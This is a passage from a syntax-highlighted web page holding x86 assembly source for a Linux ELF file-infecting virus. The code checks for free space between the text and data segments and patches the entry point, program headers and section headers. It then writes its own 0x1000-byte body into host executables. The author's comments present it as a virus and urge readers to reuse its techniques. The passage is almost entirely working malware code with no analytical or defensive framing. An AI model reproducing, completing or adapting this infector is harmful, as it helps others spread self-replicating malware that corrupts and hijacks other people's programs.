</span><span class="sc5">is_ex</span><span class="sc4">:</span><span class="sc0">          
         

     </span><span class="sc1">; saving all necesary info from EHDR to stack.</span><span class="sc0">
     </span><span class="sc1">; those are several techniques that i also used in my last virus(herderv)</span><span class="sc0">
     </span><span class="sc1">; they're quite good and you should use them too... ;)</span><span class="sc0">

</span><span class="sc1">;############# CHK_EHDR ######################</span><span class="sc0">
</span><span class="sc5">chk_ehdr</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x18</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; e_entry</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x1c</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; e_phoff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x20</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; e_shoff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x2c</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xffff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; e_phnum</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x2c</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xffff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; e_shnum</span><span class="sc0">

    
    </span><span class="sc1">; we want to insert our virus between the end of .text section and</span><span class="sc0">
    </span><span class="sc1">; the beginning of .data section.so we have to calculate the offset</span><span class="sc0">
    </span><span class="sc1">; between these segments and then compare it with our virus lenght</span><span class="sc0">
    </span><span class="sc1">; so that we can insert our virus there.</span><span class="sc0">


</span><span class="sc1">;############## CHK_SPACE ##################</span><span class="sc0">
</span><span class="sc5">chk_space</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ptr to mapped file</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_phoff</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">; phdr[0]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; phdr[3].p_vaddr -</span><span class="sc0">
                                         </span><span class="sc1">; FLAGS:RW(data segment)</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; phdr[3].p_filesz</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; phdr[2].p_filesz</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; phdr[2].p_vaddr - FLAGS:</span><span class="sc0">
                                         </span><span class="sc1">; RE(text segment)</span><span class="sc0">
                         

           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; end of phdr[2] (text segment)</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0x1000</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0"> </span><span class="sc5">err_to_small</span><span class="sc0">      </span><span class="sc1">; there is no space where to</span><span class="sc0">
                                         </span><span class="sc1">; write our virus</span><span class="sc0">
                    
    </span><span class="sc1">; patching the entry point of file: the new entry point will be the end</span><span class="sc0">
    </span><span class="sc1">; of the .text section where we insert our virus later.</span><span class="sc0">


</span><span class="sc1">;############ PATCH_EHDR ##################</span><span class="sc0">
</span><span class="sc5">patch_ehdr</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_entry</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; phdr[2].p_filesz</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ptr to mapped file</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0x18</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">; fix entry point</span><span class="sc0">
           
        
</span><span class="sc1">;############ PATCH_SHOFF #################</span><span class="sc0">
</span><span class="sc5">patch_shoff</span><span class="sc4">:</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">


   </span><span class="sc1">; patching the PHDR : if p_offset of that phdr struture = 0 -&gt; this phdr</span><span class="sc0">
   </span><span class="sc1">; belongs to the .text section -&gt; p_filesz and p_memsz will be increased</span><span class="sc0">
   </span><span class="sc1">; with the virus lenght</span><span class="sc0">
                       </span><span class="sc1">; if p_offset isn't 0 -&gt; the p_filesz from .text seg</span><span class="sc0">
   </span><span class="sc1">; will be compared with the p_offset -&gt; if p_filesz is greater that phdr</span><span class="sc0">
   </span><span class="sc1">; will not be patched , if not the p_offset will be with vir lenght patched</span><span class="sc0">


</span><span class="sc1">;############# PATCH_PHDR #################</span><span class="sc0">
</span><span class="sc5">patch_phdr</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_phnum</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_phoff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ptr to mapped file</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; mov to fist seg og PHDR</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; phdr[2].p_filesz</span><span class="sc0">

</span><span class="sc1">;############# READ_PHDR #################</span><span class="sc0">
</span><span class="sc5">read_phdr</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; is this .text ???p_offset =</span><span class="sc0">
                                         </span><span class="sc1">; [esi+4]=0</span><span class="sc0">

           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_phdr_patch</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">  </span><span class="sc1">; patch phdr[2].p_filesz</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">  </span><span class="sc1">; patch phdr[2].p_memsz</span><span class="sc0">


</span><span class="sc1">;############## NO_PHDR_PATCH ############</span><span class="sc0">
</span><span class="sc5">no_phdr_patch</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">dont_patch_ph</span><span class="sc0">           </span><span class="sc1">; if p_filesz &gt; p_offset</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0">   </span><span class="sc1">; patching p_offset</span><span class="sc0">

</span><span class="sc1">;############## DONT_PATCH_PH ###########</span><span class="sc0">
</span><span class="sc5">dont_patch_ph</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0x20</span><span class="sc0">               </span><span class="sc1">; offset to next pht entry</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">read_phdr</span><span class="sc0">
           
   </span><span class="sc1">; patching SHDR: if phdr[2].p_filesz == offset to end of SHDR entry then</span><span class="sc0">
   </span><span class="sc1">; sh_size will be patched , if not the sh_offset will be compared with</span><span class="sc0">
   </span><span class="sc1">; phdr[2].p_filesz -&gt; if sh_offset lower there'll be no patch , else</span><span class="sc0">
   </span><span class="sc1">; patch sh_offset ...</span><span class="sc0">


</span><span class="sc1">;############## PATCH_SHDR ###############</span><span class="sc0">
</span><span class="sc5">patch_shdr</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_shnum</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; e_shoff</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; ptr to mapped file</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">               </span><span class="sc1">; sh[0]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; phdr[2].p_filesz</span><span class="sc0">

</span><span class="sc1">;############## READ_SHDR ###############</span><span class="sc0">
</span><span class="sc5">read_shdr</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; sh_offset</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; [esi+20]=sh_size</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_shdr_patch</span><span class="sc0">

           </span><span class="sc1">; patching .text section</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0"> </span><span class="sc1">; patching sh_size</span><span class="sc0">

</span><span class="sc1">;############## NO_SHDR_PATCH ##########</span><span class="sc0">
</span><span class="sc5">no_shdr_patch</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">dont_patch_sh</span><span class="sc0">

           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc2">0x1000</span><span class="sc0"> </span><span class="sc1">; patching sh_offset</span><span class="sc0">

</span><span class="sc1">;############## DONT_PATCH_SH ###########</span><span class="sc0">
</span><span class="sc5">dont_patch_sh</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">                </span><span class="sc1">; next entry in the shdr table</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">read_shdr</span><span class="sc0">
           </span><span class="sc1">;jmp no_elf</span><span class="sc0">

</span><span class="sc1">;############## START_VIR ###############          </span><span class="sc0">
</span><span class="sc5">start_vir</span><span class="sc4">:</span><span class="sc0"> 
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">48</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; from where to copy the virus</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">52</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; fd to write the virus</span><span class="sc0">
           
           </span><span class="sc1">; writting until end of old .text section (phdr[2].p_filesz)</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">; ebx = 4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                 </span><span class="sc1">; SYS_WRITE</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc1">; write the virus...</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0x1000</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">               </span><span class="sc1">; SYS_LSEEK</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0x1000</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; SEEK_SET</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">
           
           </span><span class="sc1">; writting after virus ...</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; phdr[2].p_filesz</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; file lenght </span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; remaining bytes to write</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0"> 
           
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_elf</span><span class="sc0">

</span><span class="sc1">;############## EXIT ####################</span><span class="sc0">
</span><span class="sc5">err_to_small</span><span class="sc4">:</span><span class="sc0">                
</span><span class="sc5">no_elf</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">91</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; pointer to our mapped file</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">60</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; file lenght</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">1840</span><span class="sc0">
               </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
           </span><span class="sc6">popf</span><span class="sc0">
           </span><span class="sc6">popa</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">0x80</span><span class="sc0">

</span><span class="sc5">point</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vir_len</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">main</span><span class="sc0">
</span></div></body>
</html>
